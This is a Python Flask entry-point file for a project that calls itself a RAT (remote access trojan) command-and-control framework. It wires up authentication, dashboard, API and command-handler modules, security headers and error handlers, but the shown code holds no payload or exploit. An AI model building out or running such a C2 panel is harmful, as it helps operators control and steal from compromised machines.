#!/usr/bin/env python3
"""
Main Flask Application for Oranolio RAT - Elite C2 Framework
Refactored from monolithic web_app_real.py into modular components
"""

import os
import sys
import logging
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file, flash, g, make_response, Response
from flask_socketio import SocketIO, emit
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_wtf.csrf import CSRFProtect
from werkzeug.middleware.proxy_fix import ProxyFix

# Add current directory to Python path
sys.path.insert(0, os.path.dirname(__file__))

# Load environment variables
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

# Import configuration
from config import Config

# Import route modules
from auth_routes import auth_bp
from api_routes import api_bp
from dashboard_routes import dashboard_bp
from websocket_handlers import register_websocket_handlers
from command_handlers import register_command_handlers

# Import utilities
from auth_utils import login_required
from error_handler import error_handler, ErrorSeverity, ErrorCategory, ErrorContext
from validation_schemas import validate_input

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def create_app():
    """Create and configure the Flask application"""
    app = Flask(__name__)
    
    # Configure app
    app.config['SECRET_KEY'] = Config.SECRET_KEY
    app.config['SESSION_COOKIE_HTTPONLY'] = Config.SESSION_COOKIE_HTTPONLY
    app.config['SESSION_COOKIE_SAMESITE'] = Config.SESSION_COOKIE_SAMESITE
    
    # Configure ProxyFix for reverse proxy support
    if os.getenv('STITCH_BEHIND_PROXY', 'false').lower() in ('true', '1', 'yes'):
        x_for = int(os.getenv('STITCH_PROXY_X_FOR', '1'))
        x_proto = int(os.getenv('STITCH_PROXY_X_PROTO', '1'))
        x_host = int(os.getenv('STITCH_PROXY_X_HOST', '1'))
        x_prefix = int(os.getenv('STITCH_PROXY_X_PREFIX', '0'))
        
        app.wsgi_app = ProxyFix(
            app.wsgi_app,
            x_for=x_for,
            x_proto=x_proto,
            x_host=x_host,
            x_prefix=x_prefix
        )
    
    # Initialize extensions
    socketio = SocketIO(app, cors_allowed_origins="*", logger=True, engineio_logger=True)
    limiter = Limiter(
        app=app,
        key_func=get_remote_address,
        default_limits=[f"{Config.DEFAULT_RATE_LIMIT_HOUR} per hour"]
    )
    csrf = CSRFProtect(app)
    
    # Register blueprints
    app.register_blueprint(auth_bp)
    app.register_blueprint(api_bp)
    app.register_blueprint(dashboard_bp)
    
    # Register WebSocket handlers
    register_websocket_handlers(socketio)
    
    # Register command handlers
    register_command_handlers(app)
    
    # Add security headers
    @app.after_request
    def add_security_headers(response):
        """Add security headers to all responses"""
        response.headers['X-Frame-Options'] = 'DENY'
        response.headers['X-Content-Type-Options'] = 'nosniff'
        response.headers['X-XSS-Protection'] = '1; mode=block'
        response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
        
        # Content Security Policy
        if Config.CSP_ENABLED:
            import secrets
            nonce = secrets.token_urlsafe(16)
            g.csp_nonce = nonce
            csp_policy = Config.get_csp_policy(nonce)
            if Config.CSP_REPORT_ONLY:
                response.headers['Content-Security-Policy-Report-Only'] = csp_policy
            else:
                response.headers['Content-Security-Policy'] = csp_policy
        
        # Strict Transport Security (HTTPS only)
        if Config.ENABLE_HTTPS:
            response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload'
        
        return response
    
    # Error handlers
    @app.errorhandler(400)
    def bad_request(error):
        """Handle 400 errors"""
        context = ErrorContext(
            additional_data={'error': str(error)}
        )
        error_handler.handle_error(error, context, ErrorSeverity.MEDIUM, ErrorCategory.VALIDATION)
        return jsonify({'error': 'Bad request'}), 400
    
    @app.errorhandler(401)
    def unauthorized(error):
        """Handle 401 errors"""
        context = ErrorContext(
            additional_data={'error': str(error)}
        )
        error_handler.handle_error(error, context, ErrorSeverity.MEDIUM, ErrorCategory.AUTHENTICATION)
        return jsonify({'error': 'Unauthorized'}), 401
    
    @app.errorhandler(403)
    def forbidden(error):
        """Handle 403 errors"""
        context = ErrorContext(
            additional_data={'error': str(error)}
        )
        error_handler.handle_error(error, context, ErrorSeverity.HIGH, ErrorCategory.AUTHORIZATION)
        return jsonify({'error': 'Forbidden'}), 403
    
    @app.errorhandler(404)
    def not_found(error):
        """Handle 404 errors"""
        context = ErrorContext(
            additional_data={'error': str(error)}
        )
        error_handler.handle_error(error, context, ErrorSeverity.LOW, ErrorCategory.APPLICATION)
        return jsonify({'error': 'Not found'}), 404
    
    @app.errorhandler(429)
    def rate_limit_exceeded(error):
        """Handle 429 errors"""
        context = ErrorContext(
            additional_data={'error': str(error)}
        )
        error_handler.handle_error(error, context, ErrorSeverity.MEDIUM, ErrorCategory.SECURITY)
        return jsonify({'error': 'Rate limit exceeded'}), 429
    
    @app.errorhandler(500)
    def internal_error(error):
        """Handle 500 errors"""
        context = ErrorContext(
            additional_data={'error': str(error)}
        )
        error_handler.handle_error(error, context, ErrorSeverity.CRITICAL, ErrorCategory.SYSTEM)
        return jsonify({'error': 'Internal server error'}), 500
    
    # Health check endpoint
    @app.route('/health')
    def health():
        """Health check endpoint for deployment"""
        return jsonify({'status': 'healthy', 'timestamp': str(datetime.now())})
    
    # Root route
    @app.route('/')
    @login_required
    def index():
        """Main dashboard"""
        return render_template('dashboard_real.html')
    
    # Store instances for external access
    app.socketio = socketio
    app.limiter = limiter
    app.csrf = csrf
    
    return app

# Create app instance
app = create_app()
socketio = app.socketio

# Import here to avoid circular imports
from datetime import datetime

if __name__ == '__main__':
    # This is for development only
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)